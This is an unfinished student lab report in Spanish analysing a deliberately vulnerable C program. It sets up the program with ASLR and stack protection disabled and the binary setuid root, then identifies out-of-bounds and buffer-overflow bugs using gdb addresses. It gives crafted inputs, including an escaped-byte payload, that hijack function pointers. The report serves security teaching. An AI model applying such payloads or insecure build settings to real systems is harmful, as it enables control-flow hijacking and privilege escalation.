---
title: Vulnerabilidades software de bajo nivel
author_1: "Héctor Toral Pallás (798095)"
author_2: "Darío Marcos Casalé (795306)"
---

# Vulnerabilidades software de bajo nivel

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

Se ha desarrollado un script para compilar el ejecutable sin la protección con canarios de pila:

```bash
#!/bin/bash

gcc -m32 -fno-stack-protector -z execstack -ggdb cifrado.c -o cifrado
sudo chown root cifrado
sudo chmod 4755 cifrado
```

### Pregunta 1. 
Si, por ejemplo, se introduce el valor 666 cuando el programa pide elegir
una opci´on del men´u (1-4) se verifica un fallo de segmento. Hay una vulnerabilidad
asociada a una variable que puede ser indexada fuera de su límite.

#### Cuál es la variable?
La variable que genera el código vulnerable es: `opt`.
Al esta estar definida como un array de `[0 - COMM_SIZE-1]` si se introduce un valor mayor que `COMM_SIZE` se genera un fallo de segmento.

// Si s >= COMM_SIZE entonces accede fuea 
#### Indica la línea de código que puede indexar la variable fuera de su límite.
```c
func_ptr opt[COMM_SIZE] = {NULL, escribirPalabra, cifrar, verPalabras,
                             terminar};
//...

// La entrada es generada por el usuario
scanf("%s", resp);
resp[strlen(resp)] = '\0';
int s = atoi(resp);

// Si s >= COMM_SIZE entonces accede fuea 
terminado = opt[s](); 	// <--- código vulnerable
```

###  Pregunta 2. Hay vulnerabilidades de desbordamiento de búfer en el programa.
#### ¿Cuáles son las variables?
`resp`, `texto`, `palabra`, `offset`

#### ¿Qué parte de la memoria (e.g., código, data segment, bss, pila, heap, ...) asociada al proceso se puede desbordar?
`resp`, `texto`, `palabra`, `offset` se encuentran en el stack/pila.

#### Indica las líneas de código que pueden desbordar los búferes.

Línea 112
```c
int main() {
    ...
    scanf("%s", resp);
    ...
}
```

```c
int escribirPalabra() {
    ...
    scanf("%s", palabra);
    ...
    scanf("%u", &offset);
    ...
}
```

Se ha observado que se puede desbordar el buffer si el tamaño 
```c
int verPalabras() {
  for (struct palabraCifrada *p = lista; p != NULL; p = p->next) {
    char texto[MAX_SIZE] = "";
    strcat(texto, p->palabra);
    strcat(texto, "\t");
    strcat(texto, p->cifrado);
  }

  return 0;
}
```

### Pregunta 3. 
#### ¿Hay otras vulnerabilidades en el código? ¿Cuáles (indica las líneas de código correspondientes)?

```c
int main() {
  func_ptr extra[2] = {NULL, mostrarSecreto1};
  ...
  int s = atoi(resp);
  terminado = opt[s]();
  ...
}
```

### Pregunta 4. 
#### ¿Cuál es la dirección de las variables opt y extra? >En qué parte de la memoria se encuentran?

```
(gdb) p &opt
$2 = (func_ptr (*)[5]) 0xffffd184
(gdb) p &extra
$3 = (func_ptr (*)[2]) 0xffffd17c
```

### Pregunta 5.
#### ¿Qué datos de entrada proporcionas al programa para que opt[s] lea (y luego intente ejecutar) la dirección de la función mostrarSecreto1 guardada en extra, en lugar de una función guardada en opt?

```c
opt = {0x0, 0x56556333 <escribirPalabra>, 0x56556440 <cifrar>, 
  0x565564f6 <verPalabras>, 0x5655661a <terminar>}
extra = {0x0, 0x56556300 <mostrarSecreto1>}
```

```
Hola! Menú:
 1. Escribir palabra
 2. Cifrar
 3. Ver palabras
 4. Terminar
-1
Bien! Primer logro conseguido
```
### Pregunta 6.
#### ¿Cuál es la dirección del búfer asociado a la variable resp? ¿Y la dirección de la función mostrarSecreto2?

```
(gdb) p &resp
$8 = (char (*)[64]) 0xffffd13c

(gdb) p &mostrarSecreto2
$9 = (int (*)()) 0x565562cd <mostrarSecreto2>
```

resp[0..7] = {...}
resp[8:12] = 0x565562cd

opt[s] = 0x565562cd
s = -16

-16aaaaa\xCD\x62\x55\x56

### Pregunta 7.
#### ¿Qué datos de entrada proporcionas al programa para que opt[s] lea (y luego intente ejecutar) a partir de resp[8]?

## Conclusiones

## Referencias 